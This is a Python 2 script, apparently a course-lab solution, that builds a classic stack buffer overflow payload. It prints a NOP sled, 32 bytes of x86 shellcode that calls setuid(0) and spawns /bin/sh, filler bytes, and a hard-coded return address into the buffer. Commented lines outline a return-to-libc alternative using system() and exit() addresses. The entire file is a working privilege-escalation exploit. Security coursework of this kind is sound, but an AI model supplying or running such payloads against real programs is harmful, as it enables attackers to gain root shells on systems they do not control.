#!/usr/bin/env python2

your_buffer =  ""
# YOUR CODE: Generate buf appropriately
#NOPs
for i in range(40):
        your_buffer+= "\x90"

# shell code= 32 bytes
your_buffer=your_buffer+"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"



# As = 116-32-40= 44
for i in range(44):
	your_buffer+= "A"

#now we wish to put address of somewhbere inside buf before the shell code
#so we append that to the string now which would place it right where the ret is.

your_buffer=your_buffer+"\x0c\xef\xff\xbf"



#system() address
#your_buffer=your_buffer+"\xb0\x2d\xe4\xb7"

#exit() address
#your_buffer=your_buffer+"\xe0\x69\xe3\xb7"

# Adddress of (NOPs + /bin/sh) code
#your_buffer=your_buffer+"\xd6\x86\x04\x08"


# shell code
#your_buffer=your_buffer+"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"




print(your_buffer)
